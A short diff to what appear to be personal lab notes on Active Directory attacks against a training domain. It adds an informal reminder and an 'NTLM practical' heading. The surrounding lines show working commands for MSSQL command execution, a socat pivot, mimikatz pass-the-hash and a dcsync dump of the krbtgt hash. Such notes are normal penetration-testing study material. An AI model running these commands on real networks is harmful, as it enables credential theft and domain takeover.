@@ -361,6 +361,7 @@ PowerShell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:
 
 proxychains socat TCP4-Listen:1433,fork TCP:10.10.120.20:1433
 
+open cmd as administrator serkulsa..etc
 mimikatz sekurlsa::pth /user:s.ball /domain:cyberbotic.io /ntlm:ewewefewff /run  "c:\program.exe"
 runas /netonly /user:CYBER\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
 
@@ -394,6 +395,7 @@ krbtgt NTLM
 mimikatz(powershell) # lsadump::dcsync /user:krbtgt /domain:cyberbotic.io
 
 
+NTLM practical
 
 
 
